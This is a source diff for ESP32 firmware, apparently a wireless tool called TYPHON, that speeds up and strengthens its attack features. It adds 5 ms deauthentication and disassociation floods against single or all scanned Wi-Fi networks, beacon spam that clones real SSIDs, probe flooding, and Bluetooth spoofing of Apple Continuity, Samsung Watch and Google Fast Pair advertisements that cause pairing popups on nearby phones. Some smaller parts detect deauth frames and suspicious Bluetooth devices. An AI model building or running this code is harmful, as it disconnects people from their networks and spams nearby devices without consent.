@@ -16,6 +16,7 @@
 #include "esp_wifi.h"
 #include "esp_wifi_types.h"
 #include "esp_timer.h"
+#include "esp_bt.h"
 
 // Required so ESP32 accepts raw 802.11 TX frames (linker --wrap)
 extern "C" int __wrap_ieee80211_raw_frame_sanity_check(int32_t a, int32_t b, int32_t c) {
@@ -104,13 +105,25 @@ static void wifiScanUpdate() {
 // ============================================================
 static volatile uint16_t pktCount[14];
 static volatile uint32_t pktTotal = 0;
+static volatile uint32_t pmMgmt = 0, pmData = 0, pmCtrl = 0, pmDeauthSeen = 0;
+static volatile int8_t   pmLastRssi = 0;
 static uint8_t  pmChannel = 1;
 static bool     pmRunning = false;
+static bool     pmHop = false;   // web can enable channel hop
 static uint32_t pmLastHop = 0;
 
 static void IRAM_ATTR pmSniffer(void* buf, wifi_promiscuous_pkt_type_t type) {
   if (type != WIFI_PKT_MGMT && type != WIFI_PKT_DATA && type != WIFI_PKT_CTRL) return;
   wifi_promiscuous_pkt_t* p = (wifi_promiscuous_pkt_t*)buf;
+  if (type == WIFI_PKT_MGMT) pmMgmt++;
+  else if (type == WIFI_PKT_DATA) pmData++;
+  else pmCtrl++;
+  // Deauth 0xC0 / Disassoc 0xA0
+  if (type == WIFI_PKT_MGMT && p->rx_ctrl.sig_len >= 1) {
+    uint8_t fc0 = p->payload[0];
+    if (fc0 == 0xC0 || fc0 == 0xA0) pmDeauthSeen++;
+  }
+  pmLastRssi = p->rx_ctrl.rssi;
   if (p->rx_ctrl.channel >= 1 && p->rx_ctrl.channel <= 14) {
     pktCount[p->rx_ctrl.channel - 1]++;
     pktTotal++;
@@ -120,7 +133,8 @@ static void IRAM_ATTR pmSniffer(void* buf, wifi_promiscuous_pkt_type_t type) {
 static void pmStart() {
   memset((void*)pktCount, 0, sizeof(pktCount));
   pktTotal = 0;
-  // keep channel if already set from web (1-13)
+  pmMgmt = pmData = pmCtrl = pmDeauthSeen = 0;
+  pmLastRssi = 0;
   if (pmChannel < 1 || pmChannel > 13) pmChannel = 1;
   pmRunning = true;
   pmLastHop = millis();
@@ -150,14 +164,11 @@ static void pmUpdate() {
   if (!pmRunning) return;
   if (millis() - pmLastHop >= 180) {
     pmLastHop = millis();
-    if (webMode) {
-      // Stay on selected channel so Soft-AP remains reachable
-      esp_wifi_set_channel(pmChannel, WIFI_SECOND_CHAN_NONE);
-    } else {
+    if (pmHop || !webMode) {
       pmChannel++;
-      if (pmChannel > 14) pmChannel = 1;
-      esp_wifi_set_channel(pmChannel, WIFI_SECOND_CHAN_NONE);
+      if (pmChannel > 13) pmChannel = 1;
     }
+    esp_wifi_set_channel(pmChannel, WIFI_SECOND_CHAN_NONE);
   }
 }
 
@@ -178,17 +189,40 @@ static char customBeaconSSIDs[10][33];
 static int  customBeaconCount = 0;
 static int  customBeaconIdx = 0;
 
+// nyanBOX-style concurrent beacon pool
+#define BEACON_POOL_SIZE 10
+#define BEACON_POOL_LIFE 5
+struct BeaconPoolEntry {
+  char ssid[33];
+  uint8_t mac[6];
+  bool wpa2;
+  uint8_t age;
+  uint8_t ch;
+};
+static BeaconPoolEntry beaconPool[BEACON_POOL_SIZE];
+static bool beaconPoolReady = false;
+static uint8_t beaconLastTxCh = 0;
+static uint8_t beaconSweep = 0;
+
 static const char* beaconSSIDs[] = {
-  "Free_WiFi", "Starbucks", "Airport_WiFi", "Hotel_Guest",
-  "AndroidAP", "iPhone", "DIRECT-xy", "xfinitywifi",
-  "FBI Surveillance Van", "Pretty Fly for a Wi-Fi",
-  "Wu Tang LAN", "Never Gonna Give You Up", "404 Not Found",
-  "Get Off My LAN", "Virus-Infected Wi-Fi", "The Password Is 1234",
-  "Mom Use This One", "Abraham Linksys", "Martin Router King",
-  "Bill Wi the Science Fi", "LAN Solo", "Silence of the LANs",
-  "House LANister", "Ping's Landing", "The Promised LAN",
-  "Darude LANstorm", "Loading...", "No Free Wi-Fi Here",
-  "It Hurts When IP", "Drop It Like It's Hotspot"
+  "Mom Use This One", "Abraham Linksys", "Benjamin FrankLAN",
+  "Martin Router King", "John Wilkes Bluetooth",
+  "Pretty Fly for a Wi-Fi", "Bill Wi the Science Fi",
+  "I Believe Wi Can Fi", "Tell My Wi-Fi Love Her",
+  "No More Mister Wi-Fi", "LAN Solo", "The LAN Before Time",
+  "Silence of the LANs", "House LANister", "Winternet Is Coming",
+  "Ping's Landing", "The Ping in the North", "This LAN Is My LAN",
+  "Get Off My LAN", "The Promised LAN", "The LAN Down Under",
+  "FBI Surveillance Van 4", "Area 51 Test Site", "Drive-By Wi-Fi",
+  "Planet Express", "Wu Tang LAN", "Darude LANstorm",
+  "Never Gonna Give You Up", "Hide Yo Kids, Hide Yo Wi-Fi",
+  "Loading…", "Searching…", "VIRUS.EXE", "Virus-Infected Wi-Fi",
+  "Starbucks Wi-Fi", "The Password Is 1234", "Free Public Wi-Fi",
+  "No Free Wi-Fi Here", "Get Your Own Damn Wi-Fi", "It Hurts When IP",
+  "Dora the Internet Explorer", "404 Wi-Fi Unavailable", "Porque-Fi",
+  "Titanic Syncing", "Test Wi-Fi Please Ignore",
+  "Drop It Like It's Hotspot", "Life in the Fast LAN",
+  "Ye Olde Internet", "Lan Of The Lost", "xfinitywifi", "AndroidAP"
 };
 static const int BEACON_SSID_COUNT = sizeof(beaconSSIDs) / sizeof(beaconSSIDs[0]);
 
@@ -253,6 +287,9 @@ static void beaconStart() {
   beaconLast = 0;
   beaconCh = 1;
   beaconSent = 0;
+  beaconPoolReady = false;
+  beaconLastTxCh = 0;
+  beaconSweep = 0;
   beaconRandomMac();
   if (webMode) {
     // Keep ESP32-1 AP; only change channel for TX
@@ -277,54 +314,87 @@ static void beaconStop() {
   }
 }
 
-static void beaconUpdate() {
-  if (!beaconRunning) return;
-  if (millis() - beaconLast < 25) return;
-  beaconLast = millis();
-
-  const char* ssid;
-  if (beaconMode == 2 && customBeaconCount > 0) {
-    ssid = customBeaconSSIDs[customBeaconIdx % customBeaconCount];
-    if (webMode) beaconCh = 1;
-  } else if (beaconMode == 1 && wifiCount > 0) {
-    ssid = wifiNets[beaconCloneIdx].ssid.c_str();
-    // In web mode keep Soft-AP channel (1) so the browser stays connected
-    if (webMode) beaconCh = 1;
-    else {
-      beaconCh = wifiNets[beaconCloneIdx].ch;
-      if (beaconCh < 1 || beaconCh > 13) beaconCh = 1;
-    }
-  } else {
-    ssid = beaconSSIDs[beaconIdx];
-    if (webMode) beaconCh = 1;  // lock channel while web UI is active
+static void beaconPoolFillFunny(BeaconPoolEntry& e) {
+  const char* s = beaconSSIDs[esp_random() % BEACON_SSID_COUNT];
+  strncpy(e.ssid, s, 32); e.ssid[32] = 0;
+  for (int i = 0; i < 6; i++) e.mac[i] = (uint8_t)esp_random();
+  e.mac[0] = (e.mac[0] | 0x02) & 0xFE;
+  e.wpa2 = (esp_random() % 10) < 4;
+  e.age = 0;
+  {
+    static const uint8_t chs[] = {1, 6, 11};
+    e.ch = webMode ? 1 : chs[esp_random() % 3];
   }
-
-  bool wpa2 = (esp_random() % 10) < 4;
+}
+static void beaconPoolFillCustom(BeaconPoolEntry& e) {
+  int idx = (customBeaconCount > 0) ? (int)(esp_random() % customBeaconCount) : 0;
+  if (customBeaconCount > 0) strncpy(e.ssid, customBeaconSSIDs[idx], 32);
+  else strncpy(e.ssid, "TYPHON", 32);
+  e.ssid[32] = 0;
+  for (int i = 0; i < 6; i++) e.mac[i] = (uint8_t)esp_random();
+  e.mac[0] = (e.mac[0] | 0x02) & 0xFE;
+  e.wpa2 = (esp_random() % 10) < 4;
+  e.age = 0;
+  e.ch = 1;
+}
+static void beaconPoolFillClone(BeaconPoolEntry& e) {
+  if (wifiCount <= 0) { beaconPoolFillFunny(e); return; }
+  int idx = (int)(esp_random() % wifiCount);
+  strncpy(e.ssid, wifiNets[idx].ssid.c_str(), 32);
+  e.ssid[32] = 0;
+  for (int i = 0; i < 6; i++) e.mac[i] = (uint8_t)esp_random();
+  e.mac[0] = (e.mac[0] | 0x02) & 0xFE;
+  e.wpa2 = true;
+  e.age = 0;
+  e.ch = webMode ? 1 : wifiNets[idx].ch;
+  if (e.ch < 1 || e.ch > 13) e.ch = 1;
+}
+static void beaconSendOne(const char* ssid, const uint8_t* mac, uint8_t ch, bool wpa2) {
+  memcpy(beaconMac, mac, 6);
+  if (ch != beaconLastTxCh) {
+    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
+    beaconLastTxCh = ch;
+  }
   static uint8_t frame[128];
-  int len = beaconBuildFrame(frame, ssid, beaconCh, wpa2);
+  int len = beaconBuildFrame(frame, ssid, ch, wpa2);
   if (len > 0) {
-    esp_wifi_set_channel(beaconCh, WIFI_SECOND_CHAN_NONE);
     esp_wifi_80211_tx(WIFI_IF_AP, frame, len, false);
+    delay(1);
     esp_wifi_80211_tx(WIFI_IF_AP, frame, len, false);
     beaconSent += 2;
   }
+}
+static void beaconUpdate() {
+  if (!beaconRunning) return;
+  if (millis() - beaconLast < 20) return;
+  beaconLast = millis();
 
-  if (beaconMode == 2 && customBeaconCount > 0) {
-    customBeaconIdx = (customBeaconIdx + 1) % customBeaconCount;
-    if (customBeaconIdx == 0) beaconRandomMac();
-  } else if (beaconMode == 1 && wifiCount > 0) {
-    beaconCloneIdx = (beaconCloneIdx + 1) % wifiCount;
-    if (beaconCloneIdx == 0) beaconRandomMac();
-  } else {
-    beaconIdx = (beaconIdx + 1) % BEACON_SSID_COUNT;
-    if (beaconIdx == 0) {
-      if (!webMode) {
-        if (beaconCh == 1) beaconCh = 6;
-        else if (beaconCh == 6) beaconCh = 11;
-        else beaconCh = 1;
-      }
-      beaconRandomMac();
+  auto fill = beaconPoolFillFunny;
+  if (beaconMode == 2 && customBeaconCount > 0) fill = beaconPoolFillCustom;
+  else if (beaconMode == 1 && wifiCount > 0) fill = beaconPoolFillClone;
+
+  if (!beaconPoolReady) {
+    for (int i = 0; i < BEACON_POOL_SIZE; i++) fill(beaconPool[i]);
+    beaconPoolReady = true;
+    beaconSweep = 0;
+  }
+
+  for (int i = 0; i < BEACON_POOL_SIZE; i++) {
+    beaconSendOne(beaconPool[i].ssid, beaconPool[i].mac, beaconPool[i].ch, beaconPool[i].wpa2);
+    if (++beaconPool[i].age >= BEACON_POOL_LIFE) fill(beaconPool[i]);
+  }
+
+  if (!webMode) {
+    if (++beaconSweep >= 20) {
+      beaconSweep = 0;
+      static uint8_t hop = 0;
+      static const uint8_t chs[] = {1, 6, 11};
+      beaconCh = chs[hop++ % 3];
+      esp_wifi_set_channel(beaconCh, WIFI_SECOND_CHAN_NONE);
+      beaconLastTxCh = 0;
     }
+  } else {
+    beaconCh = 1;
   }
 }
 
@@ -424,7 +494,7 @@ static void deauthBuild(const uint8_t* bssid, bool disassoc = false) {
   memcpy(&deauthPacket[10], bssid, 6);         // Source = AP
   memcpy(&deauthPacket[16], bssid, 6);         // BSSID = AP
   deauthPacket[22] = 0x00; deauthPacket[23] = 0x00;
-  deauthPacket[24] = 0x07; deauthPacket[25] = 0x00;
+  deauthPacket[24] = 0x01; deauthPacket[25] = 0x00;  // reason: unspecified
 }
 
 // Also build station->AP style (source broadcast, dest = AP) for extra pressure
@@ -474,57 +544,52 @@ static void deauthStop() {
   }
 }
 
+static void deauthSendBurst(const uint8_t* bssid, uint8_t ch) {
+  // Always TX on the target AP channel (critical for effectiveness)
+  esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
+  deauthBuild(bssid, false);
+  deauthBuildRev(bssid);
+  for (int i = 0; i < 10; i++) {
+    esp_wifi_80211_tx(WIFI_IF_AP, deauthPacket, sizeof(deauthPacket), false);
+    delay(1);
+    deauthSent++;
+  }
+  deauthBuild(bssid, true);  // disassoc
+  for (int i = 0; i < 5; i++) {
+    esp_wifi_80211_tx(WIFI_IF_AP, deauthPacket, sizeof(deauthPacket), false);
+    delay(1);
+    deauthSent++;
+  }
+  for (int i = 0; i < 3; i++) {
+    esp_wifi_80211_tx(WIFI_IF_AP, deauthPacketRev, sizeof(deauthPacketRev), false);
+    delay(1);
+    deauthSent++;
+  }
+}
 static void deauthUpdate() {
-  // deauthTarget >= 0: single AP; -2: all APs from last scan
   if (!deauthRunning) return;
   if (deauthTarget == -2) {
     if (wifiCount <= 0) { deauthStop(); return; }
-    if (millis() - deauthLast < 30) return;
+    // nyanBOX-style: ~5 ms cadence, cycle through all APs
+    if (millis() - deauthLast < 5) return;
     deauthLast = millis();
     static int roundIdx = 0;
     if (roundIdx >= wifiCount) roundIdx = 0;
     int ti = roundIdx++;
-    deauthBuild(wifiNets[ti].bssid, false);
-    deauthBuildRev(wifiNets[ti].bssid);
-    // Keep Soft-AP on CH1 in web mode so browser stays connected
-    esp_wifi_set_channel(webMode ? 1 : wifiNets[ti].ch, WIFI_SECOND_CHAN_NONE);
-    for (int i = 0; i < 5; i++) {
-      esp_wifi_80211_tx(WIFI_IF_AP, deauthPacket, sizeof(deauthPacket), false);
-      deauthSent++;
-    }
-    deauthBuild(wifiNets[ti].bssid, true);
-    for (int i = 0; i < 3; i++) {
-      esp_wifi_80211_tx(WIFI_IF_AP, deauthPacket, sizeof(deauthPacket), false);
-      deauthSent++;
-    }
-    for (int i = 0; i < 2; i++) {
-      esp_wifi_80211_tx(WIFI_IF_AP, deauthPacketRev, sizeof(deauthPacketRev), false);
-      deauthSent++;
-    }
+    uint8_t ch = wifiNets[ti].ch;
+    if (ch < 1 || ch > 13) ch = 1;
+    deauthSendBurst(wifiNets[ti].bssid, ch);
     return;
   }
   if (deauthTarget < 0 || deauthTarget >= wifiCount) {
     deauthStop();
     return;
   }
-  if (millis() - deauthLast < 12) return;
+  if (millis() - deauthLast < 5) return;
   deauthLast = millis();
-  esp_wifi_set_channel(webMode ? 1 : wifiNets[deauthTarget].ch, WIFI_SECOND_CHAN_NONE);
-  // Deauth + disassoc + reverse direction bursts
-  deauthBuild(wifiNets[deauthTarget].bssid, false);
-  for (int i = 0; i < 6; i++) {
-    esp_wifi_80211_tx(WIFI_IF_AP, deauthPacket, sizeof(deauthPacket), false);
-    deauthSent++;
-  }
-  deauthBuild(wifiNets[deauthTarget].bssid, true);  // disassoc
-  for (int i = 0; i < 4; i++) {
-    esp_wifi_80211_tx(WIFI_IF_AP, deauthPacket, sizeof(deauthPacket), false);
-    deauthSent++;
-  }
-  for (int i = 0; i < 4; i++) {
-    esp_wifi_80211_tx(WIFI_IF_AP, deauthPacketRev, sizeof(deauthPacketRev), false);
-    deauthSent++;
-  }
+  uint8_t ch = wifiNets[deauthTarget].ch;
+  if (ch < 1 || ch > 13) ch = 1;
+  deauthSendBurst(wifiNets[deauthTarget].bssid, ch);
 }
 
 static void deauthStartAll() {
@@ -614,10 +679,9 @@ static void probeStop() {
 
 static void probeUpdate() {
   if (!probeRunning) return;
-  if (millis() - probeLast < 10) return;
+  if (millis() - probeLast < 8) return;
   probeLast = millis();
 
-  // Alternate: wildcard + named probes from last WiFi scan
   const char* ssid = nullptr;
   if (wifiCount > 0 && (probeSent % 3) != 0) {
     ssid = wifiNets[probeSsidIdx % wifiCount].ssid.c_str();
@@ -625,17 +689,16 @@ static void probeUpdate() {
   }
   int len = probeBuildNamed(ssid);
   esp_wifi_set_channel(probeCh, WIFI_SECOND_CHAN_NONE);
-  for (int i = 0; i < 5; i++) {
+  for (int i = 0; i < 6; i++) {
     esp_wifi_80211_tx(WIFI_IF_AP, probePacket, len, false);
+    delay(1);
     probeSent++;
   }
-  if (probeSent % 25 == 0) {
-    if (!webMode) {
-      probeCh++;
-      if (probeCh > 13) probeCh = 1;
-    } else {
-      probeCh = 1;  // keep Soft-AP channel
-    }
+  // Hop 1/6/11 so probes are visible across common channels
+  if (probeSent % 18 == 0) {
+    static const uint8_t chs[] = {1, 6, 11};
+    static uint8_t hi = 0;
+    probeCh = chs[hi++ % 3];
     probeRandomMac();
   }
 }
@@ -776,31 +839,55 @@ struct BleDev {
   String  name;
   String  addr;
   int32_t rssi;
+  uint32_t hits;
+  uint32_t lastSeen;
+  bool    randomized;
+  bool    suspicious;
+  uint8_t macChanges;
 };
 
 static BleDev   bleDevs[BLE_MAX_DEVS];
 static int      bleCount = 0;
 static bool     bleScanning = false;
 static bool     bleReady = false;
+static uint32_t bleSuspicious = 0;
+static uint32_t bleFloodAlerts = 0;
+static uint32_t bleNewThisScan = 0;
+
+static bool bleIsRandomizedMac(const String& mac) {
+  // First octet: random static if bits 1:0 == 11 (C0 mask style)
+  if (mac.length() < 2) return false;
+  char* end = nullptr;
+  long v = strtol(mac.substring(0, 2).c_str(), &end, 16);
+  return (v & 0xC0) == 0xC0;
+}
 
 static void bleInit() {
   if (bleReady) return;
+  // Free classic BT controller RAM so NimBLE has enough heap on ESP32-WROOM
+  esp_bt_controller_mem_release(ESP_BT_MODE_CLASSIC_BT);
   NimBLEDevice::init("");
   NimBLEDevice::setPower(ESP_PWR_LVL_P9);
   bleReady = true;
 }
 
+static int bleFindByAddr(const String& addr) {
+  for (int i = 0; i < bleCount; i++)
+    if (bleDevs[i].addr == addr) return i;
+  return -1;
+}
+
 static void bleScanStart() {
   if (bleScanning) return;
   bleInit();
-  bleCount = 0;
+  bleNewThisScan = 0;
   bleScanning = true;
   NimBLEScan* scan = NimBLEDevice::getScan();
   scan->setActiveScan(true);
-  scan->setInterval(100);
-  scan->setWindow(80);
+  scan->setInterval(80);
+  scan->setWindow(60);
   scan->setMaxResults(BLE_MAX_DEVS);
-  scan->start(4, nullptr, false);
+  scan->start(5, nullptr, false);  // slightly longer dwell
 }
 
 static void bleScanUpdate() {
@@ -809,20 +896,50 @@ static void bleScanUpdate() {
   if (scan->isScanning()) return;
   bleScanning = false;
   NimBLEScanResults results = scan->getResults();
-  bleCount = min((int)results.getCount(), BLE_MAX_DEVS);
-  for (int i = 0; i < bleCount; i++) {
+  uint32_t now = millis();
+  int n = (int)results.getCount();
+  for (int i = 0; i < n; i++) {
     NimBLEAdvertisedDevice d = results.getDevice(i);
-    bleDevs[i].rssi = d.getRSSI();
-    bleDevs[i].addr = d.getAddress().toString().c_str();
-    if (d.haveName()) bleDevs[i].name = d.getName().c_str();
-    else              bleDevs[i].name = bleDevs[i].addr;
+    String addr = d.getAddress().toString().c_str();
+    int idx = bleFindByAddr(addr);
+    if (idx < 0) {
+      if (bleCount >= BLE_MAX_DEVS) continue;
+      idx = bleCount++;
+      bleDevs[idx].addr = addr;
+      bleDevs[idx].hits = 0;
+      bleDevs[idx].macChanges = 0;
+      bleDevs[idx].suspicious = false;
+      bleDevs[idx].randomized = bleIsRandomizedMac(addr);
+      bleNewThisScan++;
+    }
+    bleDevs[idx].rssi = d.getRSSI();
+    bleDevs[idx].hits++;
+    bleDevs[idx].lastSeen = now;
+    if (d.haveName()) bleDevs[idx].name = d.getName().c_str();
+    else if (bleDevs[idx].name.length() == 0) bleDevs[idx].name = addr;
+
+    // Heuristics
+    if (bleDevs[idx].hits > 80) bleDevs[idx].suspicious = true;
+    if (bleDevs[idx].randomized) {
+      bleDevs[idx].macChanges++;
+      if (bleDevs[idx].macChanges > 6) bleDevs[idx].suspicious = true;
+    }
+    if (d.haveManufacturerData()) {
+      std::string m = d.getManufacturerData();
+      if (m.size() > 28) bleDevs[idx].suspicious = true;  // oversized mfg
+    }
   }
+  bleSuspicious = 0;
+  for (int i = 0; i < bleCount; i++)
+    if (bleDevs[i].suspicious) bleSuspicious++;
+  if (bleNewThisScan > 18) bleFloodAlerts++;
+
+  // Sort by RSSI
   for (int i = 0; i < bleCount-1; i++)
     for (int j = i+1; j < bleCount; j++)
       if (bleDevs[j].rssi > bleDevs[i].rssi) {
         BleDev t = bleDevs[i]; bleDevs[i] = bleDevs[j]; bleDevs[j] = t;
       }
-
   scan->clearResults();
 }
 
@@ -848,9 +965,16 @@ static void sniffStop() {
 
 static void sniffUpdate() {
   if (!sniffRunning) return;
-  // When previous scan finished, start another after short pause
-  if (!bleScanning && (millis() - sniffLast > 1500)) {
+  // Continuous rescan; expire stale devices (>45s)
+  if (!bleScanning && (millis() - sniffLast > 1200)) {
     sniffLast = millis();
+    uint32_t now = millis();
+    for (int i = 0; i < bleCount; ) {
+      if (now - bleDevs[i].lastSeen > 45000UL) {
+        for (int j = i; j < bleCount - 1; j++) bleDevs[j] = bleDevs[j + 1];
+        bleCount--;
+      } else i++;
+    }
     bleScanStart();
   }
 }
@@ -860,8 +984,13 @@ static void sniffUpdate() {
 // ============================================================
 static bool spoofRunning = false;
 static uint8_t spoofIdx = 0;
+static int spoofNameIdx = 0;
 static uint32_t spoofLast = 0;
-static uint8_t spoofMode = 0;  // 0 = name list, 1 = clone scanned, 2 = custom
+// 0=Apple Continuity  1=Samsung Watch  2=Google Fast Pair
+// 3=name list  4=clone scanned  5=custom name
+static uint8_t spoofMode = 0;
+static uint8_t spoofPower = 9;     // 0..9 maps toward P9
+static uint16_t spoofInterval = 32; // ADV interval units (0.625ms)
 static String  spoofCustomName = "ESP32-TYPHON";
 static const char* spoofNames[] = {
   "AirPods Pro", "Galaxy Buds", "Pixel Buds", "Sony WH-1000",
@@ -869,9 +998,23 @@ static const char* spoofNames[] = {
 };
 static const int SPOOF_COUNT = 8;
 
+// Samsung Watch models (company 0x0075)
+static const uint8_t SAMSUNG_ADV_TEMPLATE[15] = {
+  14, 0xFF, 0x75, 0x00, 0x01, 0x00, 0x02, 0x00, 0x01, 0x01, 0xFF, 0x00, 0x00, 0x43, 0x00
+};
+static const uint8_t samsungModels[] = {0x01, 0x02, 0x03}; // Watch 4/5/6
+
+// Google Fast Pair-style (service UUID FE2C)
+static const uint8_t GOOGLE_ADV_TEMPLATE[14] = {
+  0x03, 0x03, 0x2C, 0xFE,
+  0x06, 0x16, 0x2C, 0xFE, 0x00, 0xB7, 0x27,
+  0x02, 0x0A, 0x00
+};
+
 static void spoofStart() {
   spoofRunning = true;
   spoofIdx = 0;
+  spoofNameIdx = 0;
   spoofLast = 0;
   bleInit();
   if (bleScanning) {
@@ -887,30 +1030,81 @@ static void spoofStop() {
   NimBLEDevice::getAdvertising()->stop();
 }
 
+static void spoofApplyPower() {
+  // Map 0..9 → ESP_PWR_LVL (approx)
+  esp_power_level_t lvl = ESP_PWR_LVL_P9;
+  if (spoofPower <= 2) lvl = ESP_PWR_LVL_N12;
+  else if (spoofPower <= 4) lvl = ESP_PWR_LVL_N3;
+  else if (spoofPower <= 6) lvl = ESP_PWR_LVL_P3;
+  else if (spoofPower <= 8) lvl = ESP_PWR_LVL_P6;
+  NimBLEDevice::setPower(lvl);
+}
 static void spoofUpdate() {
   if (!spoofRunning) return;
-  if (millis() - spoofLast < 800) return;
+  if (millis() - spoofLast < 250) return;
   spoofLast = millis();
-
-  const char* name;
-  if (spoofMode == 2) {
-    name = spoofCustomName.c_str();
-  } else if (spoofMode == 1 && bleCount > 0) {
-    name = bleDevs[spoofIdx % bleCount].name.c_str();
-    spoofIdx = (spoofIdx + 1) % bleCount;
-  } else {
-    name = spoofNames[spoofIdx % SPOOF_COUNT];
-    spoofIdx = (spoofIdx + 1) % SPOOF_COUNT;
-  }
 
   NimBLEAdvertising* adv = NimBLEDevice::getAdvertising();
   adv->stop();
   NimBLEAdvertisementData data;
-  data.setName(name);
-  data.setFlags(0x06);
+  spoofApplyPower();
+
+  static const uint8_t appleDevs[][31] = {
+    {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x02,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
+    {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x0e,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
+    {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x0a,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
+    {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x0f,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
+    {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x13,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
+    {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x14,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
+    {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x0b,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
+    {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x11,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
+  };
+  static const int appleDevCount = 8;
+  static int rot = 0;
+
+  if (spoofMode == 0) {
+    uint8_t pkt[31];
+    memcpy(pkt, appleDevs[rot % appleDevCount], 31);
+    pkt[17] = (uint8_t)esp_random();
+    pkt[18] = (uint8_t)esp_random();
+    pkt[19] = (uint8_t)esp_random();
+    data.addData(std::string((char*)pkt, 31));
+    rot++;
+  } else if (spoofMode == 1) {
+    uint8_t pkt[15];
+    memcpy(pkt, SAMSUNG_ADV_TEMPLATE, 15);
+    pkt[14] = samsungModels[rot % 3];
+    data.addData(std::string((char*)pkt, 15));
+    rot++;
+  } else if (spoofMode == 2) {
+    uint8_t pkt[14];
+    memcpy(pkt, GOOGLE_ADV_TEMPLATE, 14);
+    pkt[13] = (uint8_t)(esp_random() % 121);
+    if (pkt[13] > 100) pkt[13] = 100;
+    data.addData(std::string((char*)pkt, 14));
+    rot++;
+  } else if (spoofMode == 5 && spoofCustomName.length() > 0) {
+    data.setFlags(0x06);
+    data.setName(spoofCustomName.c_str());
+  } else if (spoofMode == 4 && bleCount > 0) {
+    data.setFlags(0x06);
+    String n = bleDevs[spoofNameIdx % bleCount].name;
+    if (n.length() > 28) n = n.substring(0, 28);
+    data.setName(n.c_str());
+    spoofNameIdx = (spoofNameIdx + 1) % bleCount;
+  } else {
+    // Mode 3 or fallback: rotating friendly names
+    data.setFlags(0x06);
+    data.setName(spoofNames[spoofIdx % SPOOF_COUNT]);
+    spoofIdx = (spoofIdx + 1) % SPOOF_COUNT;
+  }
+
   adv->setAdvertisementData(data);
-  adv->setMinInterval(80);
-  adv->setMaxInterval(160);
+  uint16_t iv = spoofInterval;
+  if (iv < 16) iv = 16;
+  if (iv > 160) iv = 160;
+  adv->setMinInterval(iv);
+  adv->setMaxInterval(iv + 16);
   adv->start();
 }
 
@@ -990,51 +1184,78 @@ static void sourBeginAdvertise() {
 
 static void sourUpdate() {
   if (!sourRunning) return;
-  if (millis() - sourLast < 25) return;  // faster spam
+  if (millis() - sourLast < 20) return;  // match working ~20 ms cadence
   sourLast = millis();
   sourSent++;
 
   int idx = sourSelected;
   if (idx < 0 || idx >= APPLE_LIST_COUNT)
-    idx = (int)(esp_random() % APPLE_LIST_COUNT);  // Random Mix
+    idx = (int)(esp_random() % APPLE_LIST_COUNT);
   const AppleType& t = appleList[idx];
-  uint8_t mfg[31];
-  int mfgLen = 0;
+
+  // Full AD structures as used by working Bluedroid raw ADV path
+  uint8_t packet[31];
+  uint8_t plen = 0;
 
   if (t.isModel) {
-    // Proximity pairing style packet
-    mfg[0] = 0x4C; mfg[1] = 0x00;     // Apple
-    mfg[2] = 0x07; mfg[3] = 0x19; mfg[4] = 0x07;
-    mfg[5] = t.code; mfg[6] = t.code2;
-    mfg[7] = 0x20; mfg[8] = 0x75; mfg[9] = 0xAA; mfg[10] = 0x30;
-    mfg[11] = 0x01; mfg[12] = 0x00; mfg[13] = 0x00; mfg[14] = 0x45;
-    for (int i = 15; i < 31; i++) mfg[i] = (uint8_t)(esp_random() & 0xFF);
-    mfgLen = 31;
+    // Proximity pairing: length 0x1E, type 0xFF, Apple 0x4C00, Continuity 0x07...
+    packet[0]  = 0x1E;
+    packet[1]  = 0xFF;
+    packet[2]  = 0x4C;
+    packet[3]  = 0x00;
+    packet[4]  = 0x07;
+    packet[5]  = 0x19;
+    packet[6]  = 0x07;
+    packet[7]  = t.code;
+    packet[8]  = t.code2;
+    packet[9]  = 0x20;
+    packet[10] = 0x75;
+    packet[11] = 0xAA;
+    packet[12] = 0x30;
+    packet[13] = 0x01;
+    packet[14] = 0x00;
+    packet[15] = 0x00;
+    packet[16] = 0x45;
+    packet[17] = (uint8_t)esp_random();
+    packet[18] = (uint8_t)esp_random();
+    packet[19] = (uint8_t)esp_random();
+    for (int i = 20; i < 31; i++) packet[i] = 0x00;
+    plen = 31;
   } else {
-    // Nearby action popup style
-    mfg[0] = 0x4C; mfg[1] = 0x00;
-    mfg[2] = 0x0F; mfg[3] = 0x05; mfg[4] = 0xC0;
-    mfg[5] = t.code;
-    mfg[6] = (uint8_t)(esp_random() & 0xFF);
-    mfg[7] = (uint8_t)(esp_random() & 0xFF);
-    mfg[8] = (uint8_t)(esp_random() & 0xFF);
-    mfgLen = 9;
+    // Nearby action popup
+    packet[0] = 0x0A;
+    packet[1] = 0xFF;
+    packet[2] = 0x4C;
